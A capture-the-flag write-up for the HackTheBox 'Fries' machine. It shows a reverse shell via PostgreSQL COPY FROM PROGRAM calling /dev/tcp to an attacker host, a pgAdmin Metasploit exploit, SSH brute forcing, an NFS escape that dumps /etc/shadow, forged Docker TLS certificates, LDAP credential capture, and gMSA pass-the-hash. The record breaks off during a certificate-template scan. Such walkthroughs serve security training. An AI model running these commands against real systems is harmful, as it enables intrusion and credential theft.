# Fries HackTheBox (Hard)

## Port Scanning

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 07:22 PST
Nmap scan report for 10.10.11.96
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://fries.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 15:25:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp    open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
| Not valid before: 2025-06-01T22:06:09
|_Not valid after:  2026-06-01T22:06:09
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
|_ssl-date: 2025-11-25T15:27:31+00:00; +3m14s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49913/tcp open  msrpc         Microsoft Windows RPC
49975/tcp open  msrpc         Microsoft Windows RPC
63679/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3m13s, deviation: 1s, median: 3m13s
| smb2-time: 
|   date: 2025-11-25T15:26:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.48 seconds
```

We see several interesting things on various ports, including an `SSH` and an `80` port, meaning there is an internal `Linux` system in addition to the `Windows` host. We are also interested in the `SMB` server and `Kerberos` from the `Windows` side.

We also see a `domain` that we need to add to our important `hosts` file.

```shell
nano /etc/hosts

#Inside nano
<IP>            fries.htb dc01.fries.htb
```
Save it...

We are given credentials directly from `HTB`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 092605.png" alt=""><figcaption></figcaption></figure>

```
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

Let's test these credentials to see where they are valid. If we try `SSH`, they won't be correct, and they won't work for `SMB` either.

## FFUF Subdomains

We will perform `fuzzing` with the `FFUF` tool as follows:

```shell
ffuf -c -w <WORDLIST> -u http://fries.htb -H "Host: FUZZ.fries.htb" -fw 4
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://fries.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.fries.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

code                    [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 47ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

We find a `subdomain` named `code`. Let's add it to our `hosts` file.

```shell
nano /etc/hosts

#Inside nano
<IP>            fries.htb dc01.fries.htb code.fries.htb
```

If we visit it, we see the following:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 111215.png" alt=""><figcaption></figcaption></figure>

We see an interesting piece of `software` called `Gitea`. If we try the credentials provided by `HTB`, we see that they work, and we are logged in:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 111236.png" alt=""><figcaption></figcaption></figure>

Let's look around the repos for useful information.

If we go to the user's `commits`, we find `PostgreSQL` credentials in the `.env` file:

```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

These are quite interesting. If we continue investigating, we also find this:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 112611.png" alt=""><figcaption></figcaption></figure>

Reading the `README.md`, we see a `subdomain` hosting the `PostgreSQL DB`. Let's add it to our `hosts` file.

```shell
nano /etc/hosts

#Inside nano
<IP>            fries.htb dc01.fries.htb code.fries.htb db-mgmt05.fries.htb
```

If we visit that `subdomain`, we see the following:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 112815 (1).png" alt=""><figcaption></figcaption></figure>

We see a `PgAdmin` `login`. If we try the found credentials, we get no luck, but if we reuse the password from the `HTB` user:

```
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

It works, and we are logged in:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 112958.png" alt=""><figcaption></figcaption></figure>

If we open the `DB`, it asks for the `root` password. We use the one we obtained from `gitea`, which is `PsqLR00tpaSS11`, and all the `DB` information is displayed.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 113112.png" alt=""><figcaption></figcaption></figure>

Let's open a `Query` terminal and try to execute system commands from `PgAdmin`. First, let's see if `id` or directory listing works.

```postgresql
SELECT pg_ls_dir('/'); -- This works, returns directories
SELECT pg_read_file('/etc/passwd'); -- We can read files

-- Execute system commands
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'id';
SELECT * FROM cmd_test;
```

Info:

```
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

It's working, so let's send ourselves a `reverse shell`. First, we set up a listener:

```shell
nc -lvnp <PORT>
```

Now we send this:

```sql
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1"';
SELECT * FROM cmd_test;
```

When we check our listener, we see the following:

```
listening on [any] 7777 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.96] 49872
bash: cannot set terminal process group (430): Inappropriate ioctl for device
bash: no job control in this shell
postgres@858fdf51af59:~/data$ whoami
whoami
postgres
```

It worked! We get a shell, so let's sanitize it.

### Shell Sanitization (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# To see our console dimensions on the Host
stty size

# To resize the console using the appropriate parameters
stty rows <ROWS> columns <COLUMNS>
```

But we don't find anything too interesting. Let's look for vulnerabilities associated with `PgAdmin`. A quick search reveals `CVE-2025-2945`. Let's exploit it with `msfconsole`.

## CVE-2025-2945 (RCE)

```shell
msfconsole -q
```

Inside, we select the `exploit` module:

```shell
use exploit/multi/http/pgadmin_query_tool_authenticated
```

Checking the options, we configure it as follows:

```shell
set LHOST <IP_ATTACKER>
set LPORT <PORT>
set RHOSTS <IP_VICTIM>
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS PsqLR00tpaSS11
set DB_NAME ps_db
set RHOSTS db-mgmt05.fries.htb
set VHOST db-mgmt05.fries.htb
```

Now, if we run `exploit`, we see this:

```
[*] Started reverse TCP handler on 10.10.14.49:7755 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
[+] Successfully authenticated to pgAdmin
[+] Successfully initialized sqleditor
[*] Exploiting the target...
[*] Sending stage (24768 bytes) to 10.10.11.96
[+] Received a 500 response from the exploit attempt, this is expected
[*] Meterpreter session 1 opened (10.10.14.49:7755 -> 10.10.11.96:49808) at 2025-11-25 10:49:55 -0800

meterpreter > getuid
Server username: pgadmin
```

It worked, and we gained access as another user in another container. Let's see what we can do here.

## Escalate user svc

If we list environment variables, we find the following:

```shell
env
```

Info:

```
HOSTNAME=cb46692a4590
SHLVL=1
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
SERVER_SOFTWARE=gunicorn/22.0.0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OAUTHLIB_INSECURE_TRANSPORT=1
CORRUPTED_DB_BACKUP_FILE=
PWD=/pgadmin4
PGAPPNAME=pgAdmin 4 - CONN:3139039
PYTHONPATH=/pgadmin4
```

We see a password for the user `admin@fries.htb`. If we try it in `PgAdmin`, it works, and after entering the `root` password, it lists the `DBs`, though nothing interesting is found. We save this password for future use.

Let's try to gather users by creating a user list and brute-forcing `SSH`. If we go to the page where we found the subdomain called `pwm` using fuzzing, we need to access it via `HTTPS`.

```
URL = https://pwm.fries.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 141019.png" alt=""><figcaption></figcaption></figure>

We see a `login` page. If we try any credentials, like `admin:admin`, we see:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 141058.png" alt=""><figcaption></figcaption></figure>

We get an error that shows important information, including a user. With this info, let's create `users.txt`.

> users.txt

```
admin
d.cooper
cooper
dale
administrator
root
postgres
pgadmin
fries
svc_infra
svc
infra
```

Now let's run `hydra`.

```shell
hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-25 11:41:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries (l:13/p:1), ~1 try per task
[DATA] attacking ssh://10.10.11.96:22/
[22][ssh] host: 10.10.11.96   login: svc   password: Friesf00Ds2025!!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-25 11:41:25
```

### SSH (svc)

It worked! Let's access via `SSH` with the credentials.

```shell
ssh svc@<IP>
```

We enter `Friesf00Ds2025!!` as the password...

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Nov 25 08:13:05 PM UTC 2025

  System load:  0.0                Processes:             211
  Usage of /:   67.7% of 13.67GB   Users logged in:       1
  Memory usage: 74%                IPv4 address for eth0: 192.168.100.2
  Swap usage:   0%

  => There are 4 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Nov 25 20:13:06 2025 from 10.10.14.3
svc@web:~$ whoami
svc
```

We are logged in. Now let's do some enumeration.

## Escalate user svc\_infra

### NFS Vulnerability

Extensive investigation shows a vulnerability at the `NFS` level. This can be discovered by listing the following:

```shell
showmount -e localhost
```

Info:

```
Export list for localhost:
/srv/web.fries.htb *
```

We can mount anything inside this folder, and coincidentally, there is a folder with all permissions:

```shell
ls -la /srv/web.fries.htb
```

Info:

```
total 20
drw-r-xr-x 5  655 root           4096 May 28 17:17 .
drwxr-xr-x 3 root root           4096 May 27  2025 ..
drwxrwx--- 2 root infra managers 4096 May 26  2025 certs
drwxrwxrwx 2 root root           4096 Nov 26 16:14 shared
drwxr----- 5 svc  svc            4096 Jun  7 13:30 webroot
```

Before doing anything, having identified this, let's go to our `kali` machine and work from there using a tool that creates a `tunnel` or a `proxy/VPN` to the victim server to work externally as if we were on the internal local network.

```shell
apt install sshuttle
```

Once installed, we run it like this:

```shell
sshuttle -r svc@<IP> -N
```

Info:

```
svc@10.10.11.96's password: 
c : Connected to server.
```

The connection is `tunneled`. Now, from another terminal on our `kali`, we download a tool found online that helps with this exploitation:

URL = [GitHub nfs-security-tooling](https://github.com/hvs-consulting/nfs-security-tooling)

We run these commands to install the tool:

```shell
sudo apt update
sudo apt install pkg-config libfuse3-dev python3-dev
pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git
```

Info:

```
installed package nfs_security_tooling 0.1, installed using Python 3.13.7
  These apps are now globally available
    - fuse_nfs
    - nfs_analyze
⚠️  Note: '/root/.local/bin' is not on your PATH environment variable. These apps will not be globally accessible until your PATH is updated. Run `pipx
    ensurepath` to automatically add it, or manually modify your PATH in your shell's config file (e.g. ~/.bashrc).
done! ✨ 🌟 ✨
```

Once installed correctly, we run it as follows:

```shell
/root/.local/bin/nfs_analyze 192.168.100.2 --check-no-root-squash
```

Info:

```
Checking host 192.168.100.2
Supported protocol versions reported by portmap:
Protocol          Versions  
portmap           2, 3, 4   
mountd            1, 2, 3   
status monitor 2  1         
nfs               3, 4      
nfs acl           3         
nfs lock manager  1, 3, 4   

Available Exports reported by mountd:
Directory           Allowed clients  Auth methods  Export file handle                                        
/srv/web.fries.htb  *(wildcard)      sys           0100070001000a00000000008a01da16c18a400cbc9b37e3567d3fba  

Connected clients reported by mountd:
Client               Export              
192.168.100.2(down)  /srv/web.fries.htb  

Supported NFS versions reported by nfsd:
Version  Supported  
3        Yes        
4.0      Yes        
4.1      Yes        
4.2      Yes        

NFSv3 Windows File Handle Signing: OK, server probably not Windows, File Handle not 32 bytes long

Trying to escape exports
Export: /srv/web.fries.htb: file system type ext/xfs, parent: None, 655363
Escape successful, root directory listing:
lib64 mnt sys etc proc lib snap lost+found media tmp dev var .bash_history .. swap.img srv home libx32 bin root usr . sbin lib32 opt boot run
Root file handle: 0100070201000a00000000008a01da16c18a400cbc9b37e3567d3fba02000000000000000200000000000000

GID of shadow group: 42
Content of /etc/shadow:
root:$y$j9T$yqbmFwMbHh7qoaRaY3jx..$FMFv9upB20J4yPWwAJxndkOA4zzrn5/Udv4BF9LbLq/:20239:0:99999:7:::
daemon:*:19579:0:99999:7:::                                                                                                                                  
bin:*:19579:0:99999:7:::                                                                                                                                     
sys:*:19579:0:99999:7:::                                                                                                                                     
sync:*:19579:0:99999:7:::                                                                                                                                    
games:*:19579:0:99999:7:::                                                                                                                                   
man:*:19579:0:99999:7:::                                                                                                                                     
lp:*:19579:0:99999:7:::                                                                                                                                      
mail:*:19579:0:99999:7:::                                                                                                                                    
news:*:19579:0:99999:7:::                                                                                                                                    
uucp:*:19579:0:99999:7:::                                                                                                                                    
proxy:*:19579:0:99999:7:::                                                                                                                                   
www-data:*:19579:0:99999:7:::                                                                                                                                
backup:*:19579:0:99999:7:::                                                                                                                                  
list:*:19579:0:99999:7:::                                                                                                                                    
irc:*:19579:0:99999:7:::                                                                                                                                     
gnats:*:19579:0:99999:7:::                                                                                                                                   
nobody:*:19579:0:99999:7:::                                                                                                                                  
_apt:*:19579:0:99999:7:::                                                                                                                                    
systemd-network:*:19579:0:99999:7:::                                                                                                                         
systemd-resolve:*:19579:0:99999:7:::                                                                                                                         
messagebus:*:19579:0:99999:7:::                                                                                                                              
systemd-timesync:*:19579:0:99999:7:::                                                                                                                        
pollinate:*:19579:0:99999:7:::                                                                                                                               
sshd:*:19579:0:99999:7:::                                                                                                                                    
syslog:*:19579:0:99999:7:::                                                                                                                                  
uuidd:*:19579:0:99999:7:::                                                                                                                                   
tcpdump:*:19579:0:99999:7:::                                                                                                                                 
tss:*:19579:0:99999:7:::                                                                                                                                     
landscape:*:19579:0:99999:7:::                                                                                                                               
fwupd-refresh:*:19579:0:99999:7:::                                                                                                                           
usbmux:*:19589:0:99999:7:::                                                                                                                                  
svc:$y$j9T$Y7j3MSqEJTcNTqSSVJRS2.$h0AFlCXKB9V0PZ.BIyZKSGR6WFJWlxIRiqK.JLOB4PD:20238:0:99999:7:::                                                             
lxd:!:19589::::::                                                                                                                                            
_rpc:*:20234:0:99999:7:::                                                                                                                                    
statd:*:20234:0:99999:7:::                                                                                                                                   
dnsmasq:*:20234:0:99999:7:::                                                                                                                                 
barman:*:20236:0:99999:7:::                                                                                                                                  
sssd:*:20238:0:99999:7:::                                                                                                                                    
                                                                                                                                                             
Checking no_root_squash
Export              no_root_squash  
/srv/web.fries.htb  DISABLED        

NFSv4 overview and auth methods (incomplete)
srv: pseudo
    web.fries.htb: sys
        shared: sys
        certs: sys
        webroot: sys

NFSv4 guessed exports (Linux only, may differ from /etc/exports):
Directory           Auth methods  Export file handle                                        
/srv/web.fries.htb  sys           0100070001000a00000000008a01da16c18a400cbc9b37e3567d3fba  


Trying to guess server OS
OS       Property                                      Fulfilled  
Linux    File Handles start with 0x0100                Yes        
Windows  NFSv3 File handles are 32 bytes long          No         
Windows  Only NFS versions 3 and 4.1 supported         No         
FreeBSD  Mountd reports subnets without mask           Unknown    
NetApp   netapp partner protocol supported             No         
HP-UX    Only one request per TCP connection possible  No         

Final OS guess: Linux
```

This `check` shows it's vulnerable and reveals the `shadow` file content. We proceed with the `exploitation`.

```shell
mkdir /tmp/nfs_mount
/root/.local/bin/fuse_nfs --export /srv/web.fries.htb --fake-uid --allow-write /tmp/nfs_mount 192.168.100.2
```

Now let's check if it mounted correctly.

```shell
ls -la /tmp/nfs_mount
```

Info:

```
total 0
drwxrwxrwx 2 root 59605603 4096 May 26  2025 certs
drwxrwxrwx 2 root root     4096 Nov 26 08:14 shared
drwxr--rwx 5 kali kali     4096 Jun  7 06:30 webroot
```

It worked. Since we have the `CA`, we can create a self-signed certificate as the `root` user to access via `SSH`.

We enter `certs` and open a tunnel for port `2376`, as the `certificate` is using the local `IP` and requires this to avoid errors.

```shell
ssh svc@<IP> -L 2376:127.0.0.1:2376
```

Enter the user's password to log into `SSH`. Now that the port is `tunneled`, we run a `docker` command internally from the machine but from our `kali`.

```shell
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=cert.pem \
  --tlskey=key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

Info:

```
Error response from daemon: authorization denied by plugin authz-broker: no policy applied (user: 'fries' action: 'container_list')
```

We get an error, but it's a good error. We just need to generate our self-signed certificate as `root`, as the error mentions the `fries` user's certificate is being used.

```shell
openssl genrsa -out root-key.pem 4096
openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out root-cert.pem -days 365
```

Info:

```
Certificate request self-signature ok
subject=CN=root
```

Now, we list the `dockers` processes again...

```shell
docker --tlsverify \                                                               
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

Info:

```
CONTAINER ID   IMAGE                   COMMAND                  CREATED        STATUS       PORTS                                                                        NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   "/app/startup.sh"        5 months ago   Up 7 hours   0.0.0.0:8443->8443/tcp, :::8443->8443/tcp                                    pwm
cb46692a4590   dpage/pgadmin4:9.1.0    "/entrypoint.sh"         6 months ago   Up 7 hours   443/tcp, 127.0.0.1:5050->80/tcp                                              pgadmin4
bfe752a26695   fries-web               "/usr/local/bin/pyth…"   6 months ago   Up 7 hours   127.0.0.1:5000->5000/tcp                                                     web
858fdf51af59   postgres:16             "docker-entrypoint.s…"   6 months ago   Up 7 hours   5432/tcp                                                                     postgres
b916aad508e2   gitea/gitea:1.22.6      "/usr/bin/entrypoint…"   6 months ago   Up 7 hours   127.0.0.1:3000->3000/tcp, 172.18.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
```

It's working this time. We enter the `container` that attracts our attention the most, which is with `ID` `f42`, because it's using `LDAP`, and we can modify anything we want.

```shell
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash
```

Inside the container, after some investigation, we find this file:

```shell
cat /config/PwmConfiguration.xml | grep "ldap*"
```

Info:

```
............................<REST OF THE CODE>.....................................
        <setting key="ldap.serverUrls" modifyTime="2025-06-01T19:53:04Z" profile="default" syntax="STRING_ARRAY" syntaxVersion="0">
            <value>ldaps://dc01.fries.htb:636</value>
............................<REST OF THE CODE>.....................................
```

We see a crucial section where it's attempting to connect but is erroring out. We modify the file to point to our `IP` to capture the service user's credentials while listening with `responder`.

```shell
sed -i 's|ldaps://dc01.fries.htb:636|ldap://<IP_ATTACKER>:389|' PwmConfiguration.xml
```

Once done, we connect to the hosted page:

```
URL = https://pwm.fries.htb
```

Now we set up a listener:

```shell
responder -I tun0 -wdv
```

If we enter any credentials on the `login` page and check our listener:

```
[+] Listening for events...                                                                                                                                  

[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.96
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.96
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.10.11.96
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
[+] Exiting...
```

## Escalate user GMSA\_CA\_PROD$

It worked, and we see the credentials. We test them with `netexec`.

```shell
netexec ldap <IP> -u svc_infra -p 'm6tneOMAh5p0wQ0d'
```

Info:

```
LDAP        10.10.11.96     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
LDAP        10.10.11.96     389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d
```

They are valid. Now we download a `ZIP` file for analysis in `BloodHound`.

```shell
bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -ns '<IP>' -c All --zip
```

Info:

```
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: fries.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fries.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.fries.htb
INFO: Found 19 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: web
INFO: Querying computer: DC01.fries.htb
WARNING: Could not resolve: web: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.96@53 answered The DNS operation timed out.
INFO: Done in 00M 17S
INFO: Compressing output into 20251126112728_bloodhound.zip
```

### BloodHound

We quickly install `BloodHound` in a `docker`:

URL = [Download BloodHound in Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Info:

```
..............................<REST OF INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

With the docker imported and running, we access the following `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

We log in with the provided credentials. After changing the password, we are directed inside:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Inside, we import the `.zip` and wait for the data to load. Checking the dashboard, we investigate the `svc_infra` user.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-26 133510.png" alt=""><figcaption></figcaption></figure>

The user has `ReadMSAPassword` privileges over the `GMSA_CA_PROD$` user.

### ReadMSAPassword over GMSA\_CA\_PROD$

```shell
bloodyAD --host <IP> -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
```

Info:

```
distinguishedName: CN=gMSA_CA_prod,CN=Managed Service Accounts,DC=fries,DC=htb
msDS-ManagedPassword.NT: fc20b3d3ec179c5339ca59fbefc18f4a
msDS-ManagedPassword.B64ENCODED: 9cb/xZB5W7WX099zkewhy07gX+Wjk+gD3lBgbFjCO8yOtfvp7k5BzAU/3Y4IptbwYjFScFEJmX0uptsxl2F/7w5/9vVK9P3HwSFbSW9MNsVXMYs2+d1xKTedpjjR9Cpt/1SWTqss3AJie6S4vOTsAFJBnOMiHEm/TwdRGZe75dxp07hdRTgKOHyYZ8zl1bAYkTNfCWm+lX4Oy7TEoOaijjCTWcygmkpcigGGQCtgrr5ycyEh667cWmYfUQ0Rfw5d8W56YynXM95RmvvTDaSs8S5Tm6p3VxSVR4+sqGnrF3mGCZF/XVeNc7fEVofv71v+oqJzKStLMf8TrNKs9ggt6A==
```

### evil-winrm (GMSA\_CA\_PROD$)

Now we perform a `Pass-The-Hash` via `WinRM`:

```shell
evil-winrm -i <IP> -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents>whoami
fries\gmsa_ca_prod$
```

It worked! We are logged in using an account with certificate creation/generation power. We attempt to get a self-signed certificate as the `Administrator` user, similar to how we did with `root`.

## Escalate Privileges

### Certipy-ad (Vulnerable Templates)

From our `kali` machine, we use the `certipy-ad` utility to find `vulnerable` templates using the account's credentials.

```shell
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
